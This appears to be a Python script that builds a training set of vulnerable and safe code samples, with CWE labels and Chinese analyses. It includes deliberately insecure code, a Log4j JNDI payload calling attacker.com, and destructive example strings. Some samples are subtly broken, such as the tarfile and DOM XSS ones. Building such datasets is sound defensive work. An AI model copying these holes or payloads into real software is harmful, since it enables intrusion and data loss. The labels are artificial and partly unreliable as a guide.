        if key in ALLOWED:
            setattr(user, key, value)
    db.session.commit()
    return 'Updated'
""",
    "python", "safe_mass_assignment.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 24. Prototype Pollution（CWE-1321）/ PHP Type Juggling（CWE-843）
# ===========================================================================

add(
    """
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
app.post('/config', (req, res) => {
    const config = {};
    merge(config, req.body);
    res.json(config);
});
""",
    "javascript", "vuln_proto_pollution.js",
    True, "CWE-1321 Prototype Pollution", "High",
    "req.body", "merge(config, req.body)",
    "递归合并 → __proto__ 污染 Object.prototype → 影响所有对象",
    "过滤 __proto__ / constructor / prototype 键，或用 Object.create(null)",
)

add(
    """
<?php
$token = $_GET['token'];
if ($token == $expected_token) {
    grant_access();
}
?>
""",
    "php", "vuln_php_type_juggling.php",
    True, "CWE-843 PHP类型混淆", "High",
    "$_GET['token']", "== 比较",
    "$_GET['token'] == $expected_token 使用松散比较 → 传入数组绕过：?token[]=0",
    "使用严格比较 ===；或 hash_equals() 防时序攻击",
)

# ===========================================================================
# 25. SpEL / OGNL 表达式注入（CWE-917）
# ===========================================================================

add(
    """
@RestController
public class SpelController {
    @GetMapping("/eval")
    public String eval(@RequestParam String expr) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expr);
        return exp.getValue().toString();
    }
}
""",
    "java", "vuln_spel.java",
    True, "CWE-917 SpEL表达式注入", "Critical",
    "@RequestParam expr", "parser.parseExpression(expr)",
    "用户输入直接作为 SpEL 表达式 → 任意代码执行",
    "不要解析用户输入为 SpEL；使用 SimpleEvaluationContext 限制能力",
)

add(
    """
@RestController
public class SpelController {
    @GetMapping("/eval")
    public String eval(@RequestParam String name) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression("'Hello ' + #name");
        EvaluationContext ctx = new StandardEvaluationContext();
        ctx.setVariable("name", name);
        return exp.getValue(ctx).toString();
    }
}
""",
    "java", "safe_spel_param.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 26. 时序攻击（CWE-208）/ 不安全 TLS（CWE-327）
# ===========================================================================

add(
    """
def verify_api_key(key):
    expected = "secret123"
    if key == expected:
        return True
    return False
""",
    "python", "vuln_timing_attack.py",
    True, "CWE-208 时序攻击", "Medium",
    "key 参数", "key == expected",
    "字符串 == 比较在首个不匹配字符处短路 → 计时可推断正确字符",
    "使用 hmac.compare_digest(key, expected) 常数时间比较",
    cot_type="crypto_weakness",
)

add(
    """
import hmac
def verify_api_key(key):
    expected = "secret123"
    return hmac.compare_digest(key, expected)
""",
    "python", "safe_timing_compare.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 27. CRLF 注入（CWE-93）/ HTTP 响应拆分（CWE-113）
# ===========================================================================

add(
    """
@app.route('/redirect')
def redirect_url():
    target = request.args.get('url')
    response = Response()
    response.headers['Location'] = target
    return response
""",
    "python", "vuln_crlf.py",
    True, "CWE-113 HTTP响应拆分", "Medium",
    "request.args.get('url')", "response.headers['Location'] = target",
    "target 含 \\r\\n → 注入额外 HTTP 头/响应体",
    "过滤 \\r\\n 字符；或使用框架安全的 redirect()",
)

# ===========================================================================
# 28. 日志注入（CWE-532）
# ===========================================================================

add(
    """
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    app.logger.info(f'User login: {username}')
""",
    "python", "vuln_log_injection.py",
    True, "CWE-532 日志注入", "Low",
    "request.form['username']", "app.logger.info(f'... {username}')",
    "username 含 \\n → 伪造日志条目，混淆审计",
    "过滤换行符或使用结构化日志",
)

# ===========================================================================
# 29. 资源耗尽（CWE-400 / CWE-770）
# ===========================================================================

add(
    """
@app.route('/unzip')
def unzip():
    zf = zipfile.ZipFile(request.files['file'])
    zf.extractall('/var/uploads')  # 不校验大小
    return 'OK'
""",
    "python", "vuln_zip_bomb.py",
    True, "CWE-400 资源耗尽", "Medium",
    "request.files['file']", "zf.extractall",
    "Zip Bomb：压缩比极高 → 解压耗尽磁盘/内存",
    "校验解压后总大小；限制文件数量；使用 ZipFile.infolist() 检查",
)

add(
    """
@app.route('/data')
def get_data():
    n = int(request.args.get('n', 100))
    data = list(range(n))
    return jsonify(data)
""",
    "python", "vuln_unbounded_alloc.py",
    True, "CWE-770 资源耗尽", "Medium",
    "request.args.get('n')", "list(range(n))",
    "n 无上限 → 攻击者传入巨大值耗尽内存",
    "校验上限：n = min(max(n, 0), 10000)",
)

# ===========================================================================
# 30. 明文传输（CWE-319）
# ===========================================================================

add(
    """
def send_credentials():
    import smtplib
    # 明文 SMTP
    server = smtplib.SMTP('smtp.example.com', 25)
    server.sendmail('from@a.com', 'to@b.com', 'password: 123456')
""",
    "python", "vuln_plaintext_smtp.py",
    True, "CWE-319 明文传输", "Medium",
    "SMTP 端口 25", "server.sendmail",
    "SMTP 端口 25 明文传输 → 凭证可被嗅探",
    "使用 SMTP_SSL 或 server.starttls() 加密传输",
)

# ===========================================================================
# 31. 绕过变体（难样本）
# ===========================================================================

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    # 黑名单过滤单引号
    keyword = keyword.replace("'", "")
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
""",
    "python", "vuln_sql_blacklist_bypass.py",
    True, "CWE-89 SQL注入", "High",
    "request.args.get('q')", "cursor.execute(query)",
    "replace(\"'\",\"\") 过滤可被双写 '' 绕过 → 仍可注入",
    "使用参数化查询，黑名单 replace 不能保证安全",
)

add(
    """
@app.route('/ping')
def ping():
    host = request.args.get('host', '').strip()
    result = subprocess.run(f'ping -c 1 {host}', shell=True)
    return result.stdout
""",
    "python", "vuln_cmd_strip_bypass.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('host').strip()", "subprocess.run(shell=True)",
    "strip() 只去首尾空格，中间分号仍可注入命令",
    "使用参数列表 subprocess.run(['ping','-c','1',host])",
)

add(
    """
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # 过滤 <script>
    name = name.replace('<script>', '')
    return f'<h1>Hello, {name}!</h1>'
""",
    "python", "vuln_xss_blacklist_bypass.py",
    True, "CWE-79 XSS", "High",
    "request.args.get('name')", "f-string 拼接 HTML",
    "replace('<script>','') 只过滤字面标签，<img onerror> 等向量仍可注入",
    "使用 html.escape() 对所有特殊字符统一转义",
)

add(
    """
@app.route('/file')
def get_file():
    filename = request.args.get('file', '')
    # 正则过滤 ../
    if re.search(r'\\.\\./', filename):
        abort(403)
    full_path = os.path.join('/var/data', filename)
    return open(full_path).read()
""",
    "python", "vuln_path_regex_bypass.py",
    True, "CWE-22 路径穿越", "High",
    "request.args.get('file')", "open(full_path)",
    "re.search(r'\\.\\./') 只过滤字面 ../，可被 %2e%2e%2f 或 ..\\ 绕过",
    "在 os.path.abspath 后做前缀校验：abs_target.startswith(abs_base + os.sep)",
)

# ===========================================================================
# 32. 真实 CVE 片段
# ===========================================================================

add(
    """
# CVE-2021-44228 Log4j JNDI 注入片段
import logging
logger = logging.getLogger()
user_input = "${jndi:ldap://attacker.com/Exploit}"
logger.info(f"User agent: {user_input}")
""",
    "python", "vuln_cve_log4j.py",
    True, "CWE-917 表达式注入(JNDI)", "Critical",
    "用户输入 ${jndi:...}", "logger.info",
    "日志消息含 ${jndi:ldap://...} → Log4j 解析 JNDI → 远程类加载",
    "升级 Log4j2 到 2.17.1+；禁用 JNDI 查找",
)

add(
    """
# CVE-2007-4559 tarfile 路径穿越
import tarfile
def extract_tar(fileobj):
    with tarfile.open(fileobj=extract_tar) as tf:
        tf.extractall('/var/uploads')  # 不校验成员路径
""",
    "python", "vuln_cve_tarfile.py",
    True, "CWE-22 路径穿越(tar)", "High",
    "tar 文件成员名", "tf.extractall",
    "tar 成员名含 ../../../etc/passwd → 解压穿越目录",
    "校验每个成员的绝对路径：for m in tf.getmembers(): if not os.path.abspath(os.path.join(dest, m.name)).startswith(dest): skip",
)

# ===========================================================================
# 33. Spring4Shell（CVE-2022-22965）
# ===========================================================================

add(
    """
@RestController
public class UserController {
    @PostMapping("/register")
    public String register(UserForm form) {
        // UserForm 含 class 字段会被 Spring 参数绑定
        userService.register(form);
        return "OK";
    }
}
class UserForm {
    private String name;
    private String email;
    // getters/setters
}
""",
    "java", "vuln_cve_spring4shell.java",
    True, "CWE-915 批量赋值(Spring4Shell)", "Critical",
    "POST 参数 class.*", "Spring 参数绑定到 class 字段",
    "Spring 参数绑定允许 class.loader.* → 修改 Tomcat AccessLogValve → 写 webshell",
    "升级 Spring Framework 到 5.3.18+；使用 @InitBinder 限制可绑定字段",
)

# ===========================================================================
# 34. 长文件隐藏漏洞（注意力衰减测试）
# ===========================================================================

LONG_SQL_CODE = '''
import os
import sys
import json
import logging
from datetime import datetime

# ============================================================
# 工具函数模块
# ============================================================

def setup_logging():
    logger = logging.getLogger("app")
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
    return logger

logger = setup_logging()

def load_config(path):
    with open(path) as f:
        return json.load(f)

def validate_input(value, max_len=100):
    if not value:
        return False
    if len(value) > max_len:
        return False
    return True

def format_response(data, status=200):
    return json.dumps({"data": data, "status": status})

def get_timestamp():
    return datetime.utcnow().isoformat()

def parse_query(query_string):
    result = {}
    if not query_string:
        return result
    for pair in query_string.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            result[k] = v
    return result

def sanitize_filename(name):
    return name.replace('/', '').replace('\\\\', '')

def get_db_connection():
    import sqlite3
    return sqlite3.connect('app.db')

def close_db(conn):
    conn.close()

def get_user_by_id(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    row = cursor.fetchone()
    close_db(conn)
    return row

def get_product_by_id(product_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE id = ?", (product_id,))
    row = cursor.fetchone()
    close_db(conn)
    return row

def get_order_by_id(order_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM orders WHERE id = ?", (order_id,))
    row = cursor.fetchone()
    close_db(conn)
    return row

# ============================================================
# 路由处理
# ============================================================

from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/api/user/<int:uid>')
def api_get_user(uid):
    user = get_user_by_id(uid)
    if user:
        return format_response(user)
    return format_response(None, 404)

@app.route('/api/product/<int:pid>')
def api_get_product(pid):
    product = get_product_by_id(pid)
    if product:
        return format_response(product)
    return format_response(None, 404)

@app.route('/api/order/<int:oid>')
def api_get_order(oid):
    order = get_order_by_id(oid)
    if order:
        return format_response(order)
    return format_response(None, 404)

@app.route('/api/search')
def api_search():
    # 隐藏在 280 行之后的漏洞
    keyword = request.args.get('q', '')
    conn = get_db_connection()
    cursor = conn.cursor()
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
    rows = cursor.fetchall()
    close_db(conn)
    return format_response(rows)

if __name__ == '__main__':
    app.run(debug=False)
'''

add(
    LONG_SQL_CODE,
    "python", "vuln_longfile_hidden_sql.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "在 api_search 路由中，keyword 通过字符串拼接进入 SQL → SQL 注入",
    "使用参数化查询：cursor.execute(\"... LIKE %s\", (f'%{keyword}%',))",
)

# ===========================================================================
# 35. 更多语言样本
# ===========================================================================

add(
    """
func handler(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    query := "SELECT * FROM users WHERE id = " + id
    rows, _ := db.Query(query)
    // ...
}
""",
    "go", "vuln_go_sql.go",
    True, "CWE-89 SQL注入", "Critical",
    "r.URL.Query().Get('id')", "db.Query(query)",
    "id 字符串拼接 → db.Query → SQL 注入",
    "使用参数化查询：db.Query(\"SELECT * FROM users WHERE id = $1\", id)",
)

add(
    """
char* read_file(char* name) {
    char path[256];
    sprintf(path, "/var/data/%s", name);
    return fopen(path, "r");
}
""",
    "c", "vuln_c_path.c",
    True, "CWE-22 路径穿越", "High",
    "name 参数", "fopen(path)",
    "name 拼接到 path → fopen → 路径穿越 + 缓冲区溢出",
    "校验 name 不含 ../ 并限制长度；使用 snprintf 防溢出",
)

# ===========================================================================
# 36. 安全模式白名单专项（强化模型对安全写法的识别）
# ===========================================================================

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    cursor = db.cursor()
    sql = "SELECT * FROM products WHERE name LIKE %s"
    cursor.execute(sql, (f'%{keyword}%',))
    return jsonify(cursor.fetchall())
""",
    "python", "safe_sql_var_first.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q') 获取用户输入。\n"
        "2. 危险 sink：cursor.execute(sql, ...)。\n"
        "3. 数据流：keyword 进入参数元组 (f'%{keyword}%',)。\n"
        "4. 防御检查：sql 使用 %s 占位符，参数通过元组传入。即使 SQL 字符串先赋值给变量再传入 execute，"
        "依然是参数化查询的标准写法（命中安全模式白名单第 1 条）。注意末尾注释明确写 shell=True 才是命令注入，此处无 shell=True。\n"
        "5. 结论：参数化查询有效，未发现漏洞。"
    ),
)

add(
    """
@app.route('/run')
def run_cmd():
    cmd = request.args.get('cmd', 'echo')
    arg = request.args.get('arg', '')
    result = subprocess.run([cmd, arg], capture_output=True, text=True)
    return result.stdout
""",
    "python", "safe_subprocess_list.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('cmd') / request.args.get('arg')。\n"
        "2. 危险 sink：subprocess.run。\n"
        "3. 数据流：cmd 和 arg 作为列表元素传入。\n"
        "4. 防御检查：subprocess.run 的 shell 参数默认值为 False（Python 语言事实）。"
        "列表形式 + 未显式 shell=True 时，元字符被当作普通字符传递给程序，不会触发 shell 解释。"
        "命中安全模式白名单第 2 条。注意：尽管 cmd 本身用户可控（可执行任意命令），"
        "但若 cmd 受白名单限制则安全；此处假设为示例，关注的是 shell 注入维度。\n"
        "5. 结论：列表参数 + 默认 shell=False，无命令注入。"
    ),
)

# ===========================================================================
# 37. 混淆/噪音样本（让模型学会忽略误导）
# ===========================================================================

add(
    """
# 此函数使用参数化查询，安全
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)  # 这里其实是安全的
    return jsonify(cursor.fetchall())
""",
    "python", "noise_misleading_comment.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "注释声称安全，但实际是字符串拼接 → SQL 注入；注释不能改变代码语义",
    "使用参数化查询：cursor.execute(\"... LIKE %s\", (f'%{keyword}%',))",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q')。\n"
        "2. 危险 sink：cursor.execute(query)。\n"
        "3. 数据流：keyword 通过字符串拼接进入 query。\n"
        "4. 防御检查：注释声称'参数化查询'、'安全'，但代码实际使用字符串拼接，注释不能改变代码语义。"
        "判定必须基于代码实际内容，不能凭注释下结论。\n"
        "5. 结论：字符串拼接 SQL 注入，注释误导不构成防御。"
    ),
)

add(
    """
@app.route('/run')
def run_cmd():
    # 危险！命令注入！
    result = subprocess.run(['ls', '-la'], capture_output=True, text=True)
    return result.stdout
""",
    "python", "noise_scary_comment_safe.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：无用户输入，'ls' 和 '-la' 都是硬编码字面量。\n"
        "2. 危险 sink：subprocess.run。\n"
        "3. 数据流：无外部输入进入命令参数。\n"
        "4. 防御检查：列表参数 + 未启用 shell=True（默认 shell=False）。"
        "注释声称'危险！命令注入！'是误导，实际命令参数全为字面量，无注入点。\n"
        "5. 结论：无用户可控输入，无命令注入。"
    ),
)


# ===========================================================================
# 38. SQL 注入深化：二次注入 / ORM raw / ORDER BY / 动态表名
#    这些是 3B 基座最容易漏检的 SQL 变体，需要显式训练。
# ===========================================================================

add(
    """
# 二次注入：注册时数据安全存入，后续读取时拼接进 SQL
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    # 存入时用参数化查询，安全
    cursor.execute("INSERT INTO users (name) VALUES (%s)", (username,))
    db.commit()
    return 'OK'

@app.route('/profile')
def profile():
    username = session.get('username', '')
    # 读取后直接拼接 → 二次注入
    cursor.execute("SELECT * FROM users WHERE name = '" + username + "'")
    return jsonify(cursor.fetchone())
""",
    "python", "vuln_sql_second_order.py",
    True, "CWE-89 SQL注入(二次)", "High",
    "session.get('username')（注册时存入的污染数据）", "cursor.execute(拼接)",
    "注册阶段参数化存储 → session 读取 → 字符串拼接 → cursor.execute",
    "读取后也必须使用参数化查询：cursor.execute(\"SELECT ... WHERE name = %s\", (username,))",
    analysis=(
        "分析过程：\n"
        "1. 污染源：session.get('username')。虽然 username 在注册时通过参数化查询安全存入数据库，"
        "但用户可以在注册时设置恶意用户名（如 ' OR 1=1 --），该值被原样存储。\n"
        "2. 危险 sink：cursor.execute(\"SELECT ... WHERE name = '\" + username + \"'\")。\n"
        "3. 数据流：注册时存入的恶意用户名 → session → 字符串拼接 → execute。"
        "这是典型的二次注入：数据在第一次进入系统时被安全处理，但在后续读取使用时未做防护。\n"
        "4. 防御检查：profile 路由中使用了字符串拼接而非参数化查询，无任何转义。\n"
        "5. 结论：二次 SQL 注入，风险等级 High。即使输入时做了参数化，输出使用时也必须参数化。"
    ),
)

add(
    """
@app.route('/users')
def list_users():
    order = request.args.get('order', 'id')
    # ORM raw 查询拼接用户输入到 ORDER BY
    users = User.objects.raw("SELECT * FROM users ORDER BY %s" % order)
    return jsonify(list(users))
""",
    "python", "vuln_sql_orm_raw.py",
    True, "CWE-89 SQL注入", "High",
    "request.args.get('order')", "User.objects.raw(... % order)",
    "request.args.get('order') → order → % 格式化拼接 → raw SQL",
    "ORDER BY 不能直接参数化，必须用白名单：ALLOWED_COLS = {'id','name'}; if order not in ALLOWED_COLS: abort(400)",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('order')，用户可控。\n"
        "2. 危险 sink：User.objects.raw() 执行原始 SQL。\n"
        "3. 数据流：order 通过 % 格式化拼接到 SQL 的 ORDER BY 子句。\n"
        "4. 防御检查：无白名单校验。注意 ORDER BY 后的列名不能用参数化查询（占位符只能用于值），"
        "必须用白名单校验列名。攻击者可注入 'id; DROP TABLE users--' 或 'id,(SELECT password FROM users)' 等。\n"
        "5. 结论：ORM raw 查询拼接导致 SQL 注入，风险等级 High。"
    ),
)

add(
    """
@app.route('/data')
def get_data():
    table = request.args.get('table', 'products')
    # 表名不能参数化，直接拼接
    query = "SELECT * FROM " + table
    cursor.execute(query)
    return jsonify(cursor.fetchall())
""",
    "python", "vuln_sql_dynamic_table.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('table')", "cursor.execute(query)",
    "request.args.get('table') → table → 字符串拼接 → cursor.execute",
    "表名不能参数化，必须白名单：ALLOWED_TABLES = {'products','users'}; if table not in ALLOWED_TABLES: abort(400)",
)

# 安全对照：ORDER BY 白名单
add(
    """
@app.route('/users')
def list_users():
    order = request.args.get('order', 'id')
    ALLOWED_COLS = {'id', 'name', 'created_at'}
    if order not in ALLOWED_COLS:
        abort(400)
    users = User.objects.raw("SELECT * FROM users ORDER BY %s" % order)
    return jsonify(list(users))
""",
    "python", "safe_sql_orderby_whitelist.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('order')。\n"
        "2. 危险 sink：User.objects.raw()。\n"
        "3. 数据流：order 经白名单校验后拼接到 SQL。\n"
        "4. 防御检查：ALLOWED_COLS 白名单严格校验 order 值，只允许 'id'/'name'/'created_at'。"
        "ORDER BY 的列名不能用参数化占位符，白名单是标准做法。非白名单值直接 400。\n"
        "5. 结论：白名单校验有效，未发现漏洞。"
    ),
)

# ===========================================================================
# 39. 命令注入深化：os.system / pexpect / 环境变量
# ===========================================================================

add(
    """
@app.route('/lookup')
def lookup():
    domain = request.args.get('domain', '')
    os.system(f'nslookup {domain}')
    return 'done'
""",
    "python", "vuln_os_system.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('domain')", "os.system(f'nslookup {domain}')",
    "request.args.get('domain') → domain → f-string → os.system → shell 执行",
    "禁用 os.system，改用 subprocess.run(['nslookup', domain]) 列表形式",
)

add(
    """
@app.route('/ssh')
def ssh_connect():
    host = request.args.get('host', '')
    import pexpect
    child = pexpect.spawn(f'ssh user@{host}')
    child.expect('password:')
    child.sendline('pwd123')
    return 'connected'
""",
    "python", "vuln_pexpect_injection.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('host')", "pexpect.spawn(f'ssh user@{host}')",
    "request.args.get('host') → host → f-string 拼接 → pexpect.spawn → shell 执行",
    "校验 host 为合法域名/IP；用 paramiko SSHClient 替代 pexpect 拼接",
)

add(
    """
@app.route('/run')
def run():
    # 用户控制环境变量
    env = request.args.get('env', '')
    os.environ['PATH'] = env
    subprocess.run(['ls', '-la'])
    return 'done'
""",
    "python", "vuln_env_injection.py",
    True, "CWE-78 命令注入(环境变量)", "High",
    "request.args.get('env')", "os.environ['PATH'] = env",
    "request.args.get('env') → os.environ['PATH'] → 影响 subprocess.run 的命令查找路径",
    "不要让用户控制 PATH 等安全相关的环境变量；用白名单 env 字典传入 subprocess",
)

# ===========================================================================
# 40. XSS 深化：DOM XSS / 存储型 / JavaScript URL
# ===========================================================================

add(
    """
app.get('/search', (req, res) => {
    const q = req.query.q || '';
    // DOM XSS：直接插入 innerHTML
    document.getElementById('result').innerHTML = 'Search: ' + q;
    res.send('OK');
});
""",
    "javascript", "vuln_dom_xss.js",
    True, "CWE-79 XSS(DOM)", "High",
    "req.query.q", "innerHTML",
    "req.query.q → innerHTML → DOM 注入",
    "使用 textContent 或对 q 做 HTML 转义后再赋值给 innerHTML",
)

add(
    """
@app.route('/comments')
def comments():
    # 从数据库读取评论（存储型 XSS）
    cursor.execute("SELECT content FROM comments")
    rows = cursor.fetchall()
    html = ''
    for row in rows:
        html += f'<div class="comment">{row[0]}</div>'
    return html
""",
    "python", "vuln_stored_xss.py",
    True, "CWE-79 XSS(存储型)", "High",
    "数据库评论内容", "f-string 拼接到 HTML 响应",
    "用户提交评论 → 存入数据库 → 读取时未转义 → f-string 拼接 → HTML 响应",
    "输出时转义：html.escape(row[0])；或使用 Jinja2 模板自动转义",
)

add(
    """
@app.route('/link')
def link():
    url = request.args.get('url', '/')
    return f'<a href="{url}">Click</a>'
""",
    "python", "vuln_xss_jsurl.py",
    True, "CWE-79 XSS(JavaScript URL)", "Medium",
    "request.args.get('url')", "f'<a href=\"{url}\">'",
    "request.args.get('url') → href 属性 → javascript: 伪协议执行",
    "校验 URL 协议白名单（http/https/相对路径）；禁止 javascript: 前缀",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('url')。\n"
        "2. 危险 sink：href 属性。用户可传入 javascript:alert(1) 触发 XSS。\n"
        "3. 数据流：url 直接拼接到 href 属性，未校验协议。\n"
        "4. 防御检查：无协议白名单校验。仅靠 html.escape 不足以防御 javascript: 协议。\n"
        "5. 结论：JavaScript URL 注入导致 XSS，风险等级 Medium。需校验 URL 协议白名单。"
    ),
)

# ===========================================================================
# 41. 路径穿越深化：Windows / URL 编码 / 双重编码
# ===========================================================================

add(
    """
@app.route('/file')
def get_file():
    name = request.args.get('name', '')
    # Windows 路径穿越：..\\ 在 Windows 上等价于 ../
    full = os.path.join('C:\\\\uploads', name)
    with open(full) as f:
        return f.read()
""",
    "python", "vuln_path_windows.py",
    True, "CWE-22 路径穿越(Windows)", "High",
    "request.args.get('name')", "open(full)",
    "request.args.get('name') → os.path.join → open（Windows 上 ..\\ 可穿越）",
    "使用 os.path.abspath 规范化后做前缀校验",
)

add(
    """
@app.route('/file')
def get_file():
    filename = request.args.get('file', '')
    # 仅过滤 ../ 字面量，可被 URL 编码 %2e%2e%2f 绕过
    if '../' in filename:
        abort(403)
    path = os.path.join('/var/data', filename)
    return open(path).read()
""",
    "python", "vuln_path_url_encode_bypass.py",
    True, "CWE-22 路径穿越(编码绕过)", "High",
    "request.args.get('file')", "open(path)",
    "request.args.get('file') → 字面量过滤 ../ → 可被 %2e%2e%2f 绕过 → open",
    "在 os.path.abspath 规范化后做前缀校验，不能依赖字面量过滤",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('file')。\n"
        "2. 危险 sink：open(path)。\n"
        "3. 数据流：filename 经过 '../' in filename 字面量检查后拼接到路径。\n"
        "4. 防御检查：仅检查字面量 '../'，可被 URL 编码 %2e%2e%2f 或 Unicode 绕过。"
        "Web 框架可能自动解码 %2e%2e%2f 为 ../，导致检查被绕过。"
        "正确做法是先 os.path.abspath 规范化（解码后再检查），再做前缀校验。\n"
        "5. 结论：字面量过滤可被编码绕过，路径穿越漏洞，风险等级 High。"
    ),
)

# ===========================================================================
# 42. 反序列化深化：pickle __reduce__ / Java ObjectInputStream / PHP unserialize
# ===========================================================================

add(
    """
import pickle
class User:
    def __init__(self, name):
        self.name = name

@app.route('/session')
def load_session():
    token = request.cookies.get('session', '')
    # pickle 反序列化用户可控数据 → __reduce__ RCE
    user = pickle.loads(base64.b64decode(token))
    return user.name
""",
    "python", "vuln_pickle_reduce.py",
    True, "CWE-502 不安全反序列化", "Critical",
    "request.cookies.get('session')", "pickle.loads(base64.b64decode(token))",
    "cookie → base64 解码 → pickle.loads → 触发 __reduce__ → 任意代码执行",
    "禁止 pickle 反序列化不可信数据；改用 json.loads + schema 校验",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.cookies.get('session')，完全用户可控。\n"
        "2. 危险 sink：pickle.loads()。pickle 通过 __reduce__ 机制允许反序列化时调用任意可调用对象，"
        "攻击者可构造恶意 pickle 字节流，如 __reduce__ 返回 (os.system, ('rm -rf /',))，"
        "反序列化时即执行任意命令。\n"
        "3. 数据流：cookie → base64 解码 → pickle.loads → __reduce__ 触发。\n"
        "4. 防御检查：无签名校验、无白名单类。pickle 本质上不安全，不能用于不可信数据。\n"
        "5. 结论：pickle 反序列化 RCE，风险等级 Critical。"
    ),
)

add(
    """
@app.route('/deserialize')
def deserialize():
    data = request.get_data()
    # Java ObjectInputStream 反序列化（Jython 演示）
    from java.io import ObjectInputStream, ByteArrayInputStream
    ois = ObjectInputStream(ByteArrayInputStream(data))
    obj = ois.readObject()
    return str(obj)
""",
    "java", "vuln_java_deser.java",
    True, "CWE-502 不安全反序列化", "Critical",
    "request.get_data()", "ObjectInputStream.readObject()",
    "HTTP body → ObjectInputStream.readObject → 触发 gadget chain → RCE",
    "使用白名单 ObjectInputFilter；避免反序列化不可信数据；改用 JSON",
)

add(
    """
<?php
class User {
    public $name;
    function __wakeup() {
        system($this->name);  // 魔术方法触发命令执行
    }
}
$data = $_COOKIE['user'];
$obj = unserialize($data);
echo $obj->name;
?>
""",
    "php", "vuln_php_unserialize.php",
    True, "CWE-502 不安全反序列化", "Critical",
    "$_COOKIE['user']", "unserialize($data)",
    "cookie → unserialize → __wakeup 魔术方法 → system($this->name)",
    "禁止 unserialize 不可信数据；改用 json_decode + schema 校验",
)

# ===========================================================================
# 43. 跨文件污点分析（input + sink 配对，训练模型跨文件追踪能力）
# ===========================================================================

add(
    """
# file: app_input.py
# 此文件接收用户输入并存入全局配置
from flask import request

user_config = {}

@app.route('/set_config', methods=['POST'])
def set_config():
    key = request.form['key']
    value = request.form['value']
    user_config[key] = value  # 污染数据存入全局
    return 'OK'
""",
    "python", "vuln_crossfile_input.py",
    True, "CWE-94 代码注入(跨文件)", "Critical",
    "request.form['value']（存入全局 user_config）", "eval（在 sink 文件中）",
    "request.form → user_config 全局变量 → 跨文件被 eval 执行",
    "跨文件传递用户输入时必须保持不可信假设；sink 端使用前必须校验",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.form['value']，用户可控输入。\n"
        "2. 危险 sink：本文件中未直接出现危险 sink，但污染数据存入全局变量 user_config，"
        "会被同项目的其他文件（如 app_sink.py）读取并传入 eval()。\n"
        "3. 数据流：request.form → user_config[key] → 跨文件 → eval(user_config['expr'])。\n"
        "4. 防御检查：本文件未做任何校验或转义，直接将用户输入存入全局变量。\n"
        "5. 结论：跨文件污点传播，用户输入最终到达 eval sink，构成代码注入，风险 Critical。"
        "此类漏洞需要跨文件分析才能发现。"
    ),
)

add(
    """
# file: app_sink.py
# 此文件从全局配置读取数据并执行（配套 app_input.py）
from app_input import user_config

@app.route('/calc')
def calc():
    expr = user_config.get('expr', '')
    # 跨文件污点：expr 来自用户输入
    result = eval(expr)
    return str(result)
""",
    "python", "vuln_crossfile_sink.py",
    True, "CWE-94 代码注入(跨文件)", "Critical",
    "user_config（来自 app_input.py 的全局变量）", "eval(expr)",
    "app_input.py 的 request.form → user_config → eval(expr)",
    "禁用 eval；跨文件传递的数据必须保持不可信假设，使用前校验",
    analysis=(
        "分析过程：\n"
        "1. 污染源：user_config.get('expr')。虽然本文件中没有直接读取用户输入，"
        "但 user_config 是 app_input.py 中由 request.form 填充的全局变量，数据已被污染。\n"
        "2. 危险 sink：eval(expr)，执行任意 Python 表达式。\n"
        "3. 数据流：跨文件污点传播：app_input.py request.form → user_config → eval(expr)。\n"
        "4. 防御检查：本文件未校验 expr 是否为可信输入，直接传入 eval。\n"
